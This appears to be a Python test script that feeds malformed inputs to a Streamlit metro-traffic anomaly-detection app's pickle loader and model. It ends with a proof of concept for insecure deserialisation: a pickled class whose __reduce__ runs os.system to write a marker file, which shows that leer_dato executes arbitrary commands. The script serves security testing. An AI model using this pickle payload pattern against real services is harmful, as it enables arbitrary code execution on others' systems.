import os, sys, pickle, warnings, io; warnings.filterwarnings('ignore'); os.environ['TF_CPP_MIN_LOG_LEVEL']='3'
sys.path.insert(0,'/home/user/AutoencoderMetroAnomalyApp'); os.chdir('/home/user/AutoencoderMetroAnomalyApp')
import numpy as np, contextlib
from utils import leer_dato, cargar_modelo_preentrenado, predecir, obtener_categoria
class Up:  # mimics streamlit UploadedFile.getvalue()
    def __init__(s,b): s.b=b
    def getvalue(s): return s.b
m,sc=cargar_modelo_preentrenado('./dev/results/tf_modelo_77_81_78.keras','./dev/results/scaler_77_81_78.pkl')
def run(name, obj):
    try:
        with contextlib.redirect_stdout(io.StringIO()) as f:
            d=leer_dato(Up(pickle.dumps(obj))); r=predecir(m,d,827,sc)
        import re; loss=re.findall(r'PERDIDA: (\S+)',f.getvalue()); print(f'{name:45s} -> {obtener_categoria(r):8s} MAE={loss}')
    except Exception as e: print(f'{name:45s} -> EXCEPTION {type(e).__name__}: {str(e)[:110]}')
base=pickle.load(open('dev/data_test/x_test_normal_1.pkl','rb'))
run('valid normal_1', base)
run('all NaN (20)', np.full(20,np.nan))
run('one NaN', np.r_[base[:-1],np.nan])
run('length 19', base[:19])
run('length 21', np.r_[base,0.5])
run('python list (not ndarray)', base.tolist())
run('raw passenger counts (unscaled)', sc.inverse_transform(base.reshape(1,-1))[0])
run('all zeros scaled (min of each hour)', np.zeros(20))
run('scaled x 10 (massive surge)', base*10)
run('2D shape (1,20)', base.reshape(1,-1))
run('string', 'hola')
# Insecure deserialisation: benign payload that creates a marker file
class Evil:
    def __reduce__(self): return (os.system, ('echo PWNED > /tmp/pwned_poc.txt',))
try: leer_dato(Up(pickle.dumps(Evil())))
except Exception as e: print('payload raised', type(e).__name__)
print('arbitrary command executed via leer_dato():', os.path.exists('/tmp/pwned_poc.txt'))
